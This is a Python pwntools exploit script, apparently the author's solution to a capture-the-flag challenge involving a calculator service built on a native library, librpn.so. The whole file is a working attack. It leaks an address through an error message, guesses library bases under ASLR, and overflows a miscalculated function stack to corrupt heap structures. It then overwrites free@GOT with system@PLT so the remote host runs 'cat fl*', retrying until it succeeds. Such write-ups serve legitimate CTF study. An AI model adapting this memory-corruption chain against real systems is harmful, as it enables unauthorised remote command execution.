#!/usr/bin/env python3
#
# @mebeim - 2025-06-09
#

import sys
from os import getenv

from pwn import ELF, context, log, remote, u64


class Exploit:
	def __init__(self):
		self.host = getenv('HOST', 'localhost')
		self.port = int(getenv('PORT', 1337))
		self.remote = None

		try:
			context.binary = self.librpn = ELF('./src/librpn.so', checksec=False)
			assert self.librpn.relro == 'Full', 'librpn.so should not be Full RELRO!'
		except FileNotFoundError:
			sys.exit('Need ./src/librpn.so: compile the challenge first!')

	def connect(self):
		with context.local(log_level='warning'):
			if self.remote:
				self.remote.close()

			self.remote = remote(self.host, self.port)

	def calc(self, s: str):
		self.remote.sendlineafter(b'> ', s.encode())

	def run(self) -> str|None:
		self.connect()

		# Create a dummy function and call it without enough arguments to cause
		# an error in librpn and let calculator.py leak the address of the
		# librpn_eval_expression() function via its repr() when printing the
		# error out. We could also divide by zero or reference a non-existing
		# parameter in a function to get the same leak.
		#
		# The name "SIGSEGV" here is useful for later as we can only
		# call functions that calculator.py knows about to pass parsing.
		#
		self.calc('fn SIGSEGV(a){1}')
		self.calc('SIGSEGV()')

		self.remote.recvuntil(b'librpn_eval_expression at ')
		leak = int(self.remote.recvuntil(b'>', drop=True), 0)

		# Offset between leak and libs is not stable, needs to be guessed. It
		# shouldn't take more than ~10 attempts though, which is feasible. It
		# may vary depending on host kernel version/config due to different
		# amounts of ASLR bits.
		self.librpn.address = leak + 0x2e2dc0
		max_va = max(s.header.p_vaddr + s.header.p_memsz for s in self.librpn.segments)
		librpn_end = self.librpn.address + (max_va + 0xfff) & ~0xfff

		# These offsets shouldn't change (assuming the Docker image doesn't)
		libpython = librpn_end + 0x46a000
		libpython_plt_system = libpython + 0xfd580

		log.success('Leak: %#x', leak)
		log.info('Guessed librpn    @ %#x', self.librpn.address)
		log.info('Guessed libpython @ %#x', libpython)

		# Create a few functions to get stable addresses. The layout we are
		# aiming for is one where e->stack points right before the struct
		# Function of f(). The calculated stack size will be the same as the
		# size of struct Function to ensure they are placed in the same mallocng
		# slab.
		#
		# All these functions will also have a bad stack size calculated because
		# of the bug in librpn that does not account for parameters as values
		# that need to be pushed on the stack.
		#
		# When called, evaluation will error out early because of the final "z"
		# in the expression. This avoids the need for actual math (eww) to write
		# values on the function stack.
		#
		for name in 'abcde':
			self.calc(f'fn {name}(a,b,c,d){{0+(0+(0+(0+(0+(0+(0+(a+(b+(c+(d+z))))))))))}}')

		# Create victim function f() that simply pushes a parameter on its stack
		self.calc('fn f(a){a}')

		vars = [
			0x0                 ,
			0x0                 , # next
			libpython + 0x317da7, # name ("SIGSEGV")
			self.librpn.got.free, # stack
		]

		# Corrupt struct Function of f() via stack overflow on e(): rename it to
		# a string with known address and point its stack where we want to write
		self.calc('e(' + ','.join(map(str, vars)) + ')')

		# Push "cat fl*" on the expression stack and invoke the (now renamed)
		# corrupted function to overwrite free@GOT of librpn with system@PLT of
		# libpython. librpn should be the only loaded shared library compiled
		# without full RELRO.
		#
		# The stack is freed immediately after evaluating the
		# expression and executes system("cat fl*").
		#
		cmd = u64(b'cat fl*\x00')
		self.calc(f'{cmd} + SIGSEGV({libpython_plt_system})')

		line = self.remote.recvline()
		if line.startswith(b'Eval error'):
			return None

		return line.strip().decode()


def main() -> int|str:
	context(arch='amd64')

	e = Exploit()

	# Exploit has ~10% chance of success
	for attempt in range(1, 100 + 1):
		log.info('Attempt %d...', attempt)

		try:
			flag = e.run()
		except EOFError:
			log.failure('EOFError')
		else:
			if flag is not None:
				print(flag)
				break
	else:
		return 'Exceeded max exploit attempts'

	return 0


if __name__ == '__main__':
	sys.exit(main())


